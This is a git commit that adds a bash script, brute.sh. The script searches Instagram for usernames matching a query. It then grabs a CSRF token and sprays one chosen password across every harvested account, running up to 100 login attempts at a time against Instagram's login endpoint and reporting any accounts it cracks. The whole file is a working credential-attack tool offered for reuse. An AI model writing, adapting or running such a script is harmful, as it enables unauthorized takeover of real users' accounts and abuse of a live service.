0ca1f8b1b055fde7e3f12c1ba7327427190fd634
wannabeee <41676687+wannabeee@users.noreply.github.com>
2019-07-04 14:48:10 -1200

    brute.sh

---
+++ brute.sh
@@ -0,0 +1,61 @@
+#!/bin/bash
+#author     : ./Lolz
+#visit      : https://noolep.net
+#thanks to  : JavaGhost - Bashid.org - 407AEX
+#recode tinggal recode aja okeh?, tapi cantumin source Y tolol h3h3
+
+#color
+red='\e[1;31m'
+green='\e[1;32m'
+yellow='\e[1;33m'
+blue='\e[1;34m'
+magenta='\e[1;35m'
+cyan='\e[1;36m'
+white='\e[1;37m'
+
+#banner
+echo -e $'''
+                _  __       _ 
+__     | _|_ o |_)|_     o (_|
+||||_| |  |_ | |_)|  ___ | __|
+\e[1;31mcontact: https://fb.me/n00b.me\e[1;37m
+'''
+
+#asking
+read -p $'[\e[1;34m?\e[1;37m] search by query: ' ask
+collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
+echo $'[\e[1;34m*\e[1;37m] just found: '$collect''$(< target wc -l ; echo "user")
+read -p $'[\e[1;34m?\e[1;37m] password to use: ' pass
+echo "Start cracking..."
+
+#start_brute
+token=$(curl -s -L -i "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
+function brute(){
+	url=$(curl -s -X POST "https://www.instagram.com/accounts/login/ajax/" \
+    	    -H "cookie: csrftoken=${token}" \
+        	-H "origin: https://www.instagram.com" \
+        	-H "referer: https://www.instagram.com/accounts/login/" \
+        	-H "x-csrftoken: ${token}" \
+        	-H "x-requested-with: XMLHttpRequest" \
+        	-d "username=${i}&password=${pass}&intent")
+            login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
+            if [[ $login =~ "true" ]]; then
+                    echo -e "[${green}+${white}] found ${yellow}(@$i | $pass${yellow})${white}"
+                elif [[ $login =~ "false" ]]; then
+                            echo -e "[${redls}!${white}] @$i - ${red}failed to crack${white}"
+                    elif [[ $url =~ "checkpoint_required" ]]; then
+                            echo -e "[${cyan}?${white}] ${cyan}@$i ${white}: ${yellow}checkpoint${white}"
+
+            fi
+}
+
+#thread
+(
+	for i in $(cat target); do
+		((thread=thread%100)); ((thread++==0)) && wait
+		brute "$i" &
+	done
+	wait
+)
+
+rm target
